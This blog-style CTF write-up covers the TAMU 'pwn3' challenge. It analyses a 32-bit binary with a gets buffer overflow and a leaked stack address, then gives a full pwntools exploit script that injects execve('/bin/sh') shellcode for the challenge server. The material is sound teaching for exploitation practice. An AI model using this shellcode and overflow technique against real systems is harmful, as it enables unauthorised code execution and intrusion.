# pwn3

For pwn3 let's start how we always do and get this binary into our Linux VM to take a look at it!  As always we are going to start with the three commands file, strings, and gdb's checksec.

```
user@ubuntu:~/TAMU$ file pwn3
pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5b8bcbe552d4097fbb9a1fe8612c45cfec687a01, not stripped
```
```
user@ubuntu:~/TAMU$ strings pwn3
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
gets
puts
printf
stdout
setvbuf
__libc_start_main
__gmon_start__
GLIBC_2.0
```
```
gdb-peda$ checksec
CANARY : disabled
FORTIFY : disabled
NX : disabled
PIE : disabled
RELRO : Partial
```

So we can see from these three commands that we have a 32-bit ELF style Linux executable.  We can see the gets command at the top of the strings file but no other hints there.  And from checksec we can see that most protections are disabled.

Now, let's run the file to see what it does!

![imag](https://killyp.com/wp-content/uploads/2018/03/Capture.jpg)

So, this looks like a repeat of the pwn2 problem except there will not be a deprecated print_flag function when we open it in IDA.  Also, that random number looks a whole lot like an address on the Stack.  I would bet this problem has ASLR and that is a hint, but we will verify this in gdb.  So let's open it in IDA and see if we can find that "_gets" call we saw in the strings dump.

![ida](https://killyp.com/wp-content/uploads/2018/03/Capture-1.jpg)

Just like I suspected, there is no print_flag function just hanging out and the _gets call with no bounds checking is used to grab the user input.  We can almost certainly exploit this to gain control of the instruction pointer.  Now, run it in gdb to verify that random number is on the stack and to exploit the gets vulnerability.  After we get it open in gdb set a break-point at the leave instruction in the Echo function and then throw a bunch of "A"s at stdin.

```
gdb-peda$ b *0x08048520
Breakpoint 1 at 0x8048520
gdb-peda$ r
Starting program: /home/user/TAMU/pwn3 
Welcome to the New Echo application 2.0!
Changelog:
- Less deprecated flag printing functions!
- New Random Number Generator!

Your random number 0xffffce1a!
Now what should I echo? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, at 0x08048520 in echo ()

gdb-peda$ x/x $ebp
0xffffcf08: 0xffffcf18

gdb-peda$ x/64xw $esp
0xffffce10: 0x00000001 0xf7fb7da7 0x41410001 0x41414141
0xffffce20: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffce30: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffce40: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffce50: 0x41414141 0x41414141 0xf7ff0041 0xf7fb7d60
0xffffce60: 0x00000001 0x0000000a 0xf7fb8870 0xf7e6f12d
0xffffce70: 0xf7fb7d60 0x08048660 0xf7fb7d60 0xf7e6f47b
0xffffce80: 0xf7fb7d60 0xf7fb7da7 0x00000001 0xf7e6f3ac
0xffffce90: 0xf7fb7000 0xf7fb7d60 0xf7fb8870 0xf7e6fe12
0xffffcea0: 0xf7fb7d60 0x0000000a 0x00000000 0xf7fb7000
0xffffceb0: 0xf7e6fdd7 0xf7fb7000 0x00000055 0xf7e64dfb
0xffffcec0: 0xf7fb7d60 0x0000000a 0x00000055 0x0000bf17
0xffffced0: 0xf7fe77eb 0xf7e04700 0x00000000 0xf7fb7d60
0xffffcee0: 0xffffcf18 0xf7fee010 0xf7e64cab 0x00000000
0xffffcef0: 0xf7fb7000 0xf7fb7000 0xffffcf18 0x08048564
0xffffcf00: 0x08048660 0x00000002 0xffffcf18 0x0804856c
```


Alright!  So what important information can we get out of that?  We can see that, indeed, the random number they gave us is the location on the stack that our input begins at.  Since the location on the stack that our input is being saved to is randomized, we can safely assume that ASLR is enabled.  This would normally be an inconvenience if our goal was to execute shellcode on the stack but since they tell us where it is at every time, we can use this information to execute on the stack.  We can also tell the size of the buffer by subtracting the location of our input from the current $ebp.  Also, be aware that even though ASLR is turned on and randomizing the addresses on the stack, it is only randomizing the base address. This means that the difference between addresses on the stack will be the same every time.

The location of our $ebp (0xffffcf08) minus the location of our input (0xffffce1a) gives us a buffer size of 0xEE.  Add 4 to this to account for the old saved $ebp register and our overflow needs to be 0xF2, 242 decimal, bytes long.

Our goal, with this exploit, is to read the flag.txt file that is in the same directory as the binary we are attacking.  To do this we will spawn a remote shell in that directory by having the binary execute our shellcode.  If you are unfamiliar with shellcode, it is essentially compiled assembly code that tells the system to do something (usually spawn a shell).  It is special in that it needs to avoid certain bytes such as any NULL bytes.  This is because strings are NULL terminated and our shellcode is being read in as stdin into a string.  While reading in our exploit, if it comes across a NULL byte it will stop reading in and we won't have loaded our full exploit. This is important to know if you write your own shellcode (which I highly recommend you practice) but for this example, we will just grab one off of shellstorm that will execve /bin/sh so we get a shell.

The layout of our exploit will be:

shellcode + A's to fill remaining overflow + address to shellcode

To build our exploit we will use the python library, pwntools.  This library is fantastic when it comes to writing quick exploits and takes out all of the network programming usually needed for a remote exploit.

Our python exploit then ends up looking like this:

[python]
#!/usr/bin/env python
import pwn
import time
import sys


# Constants
BUFFERSIZE = 242
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\xC3"
OVERFLOW = "A" * (BUFFERSIZE - len(SHELLCODE))

def usage():
    print "Usage: %s [FLAGS]" % sys.argv[0]
    print "\nFLAG\t\t\tOption"
    print "-l\t\t\tLocal (Default)"
    print "-r\t\t\tRemote\n"
    return

def setup(argv = ""):
    #Local Exploit
    if argv == "-l" or argv == "":
        r = pwn.process("./pwn3")

    #Remote Exploit
    elif argv == "-r":
        r = pwn.remote("pwn.ctf.tamu.edu", 4323)

    #Usage not correct
    else:
        usage()
        return

    #Build Payload and EXPLOIT!!!
    exploit(r, buildPayload(r))

def buildPayload(r):
    # Build payload
    payload = ""
    payload += SHELLCODE		# Add Shellcode
    payload += OVERFLOW			# Add overflow of 'A'
    payload += getStackAddress(r)	# Parse address and add to payload
    return(payload)

def getStackAddress(r):
    r.recvuntil('0x')
    address = r.recvuntil('!')		# Address with exclamation
    address = address.split('!')[0]	# Strip exclamation off of address
    address = int(address, 16)		# Convert from string to hex integer
    address = pwn.p32(address)		# Pack into Little Endian address string
    return(address)

def exploit(r, payload):
    r.recv()				# Revieve until prompted for input
    r.sendline(payload)			# Send our payload (stackoverflow and ROPChain)
    r.interactive()			# Keep the shell alive with Interactive command

if __name__ == "__main__":
    if len(sys.argv) > 2:
        usage()
    elif len(sys.argv) == 2:
        setup(sys.argv[1])
    else:
        setup()

[/python]
So let's run it!
![exploit](https://killyp.com/wp-content/uploads/2018/03/Capture-2.jpg)
